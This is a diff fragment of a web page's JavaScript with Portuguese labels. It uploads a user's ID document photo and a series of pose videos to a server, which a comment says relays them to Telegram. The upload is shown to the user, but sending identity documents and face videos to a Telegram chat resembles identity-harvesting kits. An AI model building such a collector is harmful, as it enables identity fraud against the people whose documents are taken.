+  // ── 2. Documento ──
+  if(docFile){
+    try{
+      ovTitle.textContent = 'A enviar documento…';
+      const fd = new FormData();
+      fd.append('photo', docFile, `${SESS}_documento.jpg`);
+      fd.append('caption', `📄 Documento — ${SESS}`);
+      const r = await fetch(`${SERVER_URL}/send-photo`, { method:'POST', body:fd });
+      if(!r.ok) throw new Error(await r.text());
+      setProgress('Documento enviado ✅');
+    } catch(e){
+      console.warn('doc:', e);
+      setProgress('Documento (erro)');
+    }
+  }
+
+  // ── 3. Vídeos — servidor converte e envia ao Telegram ──
+  for(const [id, data] of entries){
+    const num      = String(POSES.findIndex(p=>p.id===id)+1).padStart(2,'0');
+    const ext      = data.blob.type.includes('mp4') ? 'mp4' : 'webm';
+    const filename = `${SESS}_${num}-${id}.${ext}`;
+
+    try{
+      ovTitle.textContent = `📤 A converter e enviar: ${data.em} ${data.label}`;
+      const fd = new FormData();
+      fd.append('video',    data.blob, filename);
+      fd.append('caption',  `${data.em} ${data.label} — ${SESS}`);
+      fd.append('filename', `${SESS}_${num}-${id}.mp4`);
+
+      const r = await fetch(`${SERVER_URL}/send-video`, { method:'POST', body:fd });
+      if(!r.ok) throw new Error(await r.text());
+      setProgress(`${data.em} ${data.label} ✅`);
+    } catch(e){
+      console.warn('video:', e);
+      setProgress(`${data.em} ${data.label} ⚠️`);
+    }
+  }
+
+  overlay.classList.remove('show');
+  document.getElementById('sendSpin').style.display = 'none';
+  document.getElementById('sendTxt').style.color    = 'var(--ok)';
+  document.getElementById('sendTxt').textContent    = '✅ Vídeos enviados em MP4!';
+}
+
+async function serverMsg(text){
+  const r = await fetch(`${SERVER_URL}/send-message`, {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ text })
+  });
+  if(!r.ok) throw new Error('send-message: '+r.status);
+}
+
+
+buildSteps();
+</script>
+</body>
+</html>
